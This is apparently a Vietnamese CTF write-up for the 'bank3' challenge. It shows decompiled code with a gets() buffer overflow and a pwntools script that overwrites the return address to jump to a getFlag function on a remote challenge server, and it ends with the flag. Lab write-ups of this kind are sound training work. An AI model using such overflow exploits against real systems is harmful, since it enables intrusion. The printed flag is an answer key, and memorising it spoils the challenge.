# bank3
## Đề bài
```c
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch]
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
}
```

```asm
.text:08048506                 public getFlag
.text:08048506 getFlag         proc near
.text:08048506
.text:08048506 var_4           = dword ptr -4
.text:08048506
.text:08048506 ; __unwind {
.text:08048506                 push    ebp
.text:08048507                 mov     ebp, esp
.text:08048509                 push    ebx
.text:0804850A                 sub     esp, 4
.text:0804850D                 call    __x86_get_pc_thunk_ax
.text:08048512                 add     eax, 1AEEh
.text:08048517                 sub     esp, 0Ch
.text:0804851A                 lea     edx, (aCatFlagTxt - 804A000h)[eax] ; "cat flag.txt"
.text:08048520                 push    edx             ; command
.text:08048521                 mov     ebx, eax
.text:08048523                 call    _system
.text:08048528                 add     esp, 10h
.text:0804852B                 nop
.text:0804852C                 mov     ebx, [ebp+var_4]
.text:0804852F                 leave
.text:08048530                 retn
```
- Đây là 1 bài ghi đè return address, chỉ cần ghi đè return address về địa chỉ hàm `getFlag`
- Địa chỉ hàm `getFlag` là `0x08048506`

## Script
```python3
from pwn import *

r = remote('61.28.237.24', 30204)

print(r.recvuntil('Please enter your name: '))
payload = b'a' * 80
payload += p32(0x8048506)
r.sendline(payload)
print(r.recv(1024))
print(r.recvall())
```

Flag: HCMUS-CTF{overwrite_all_the_things}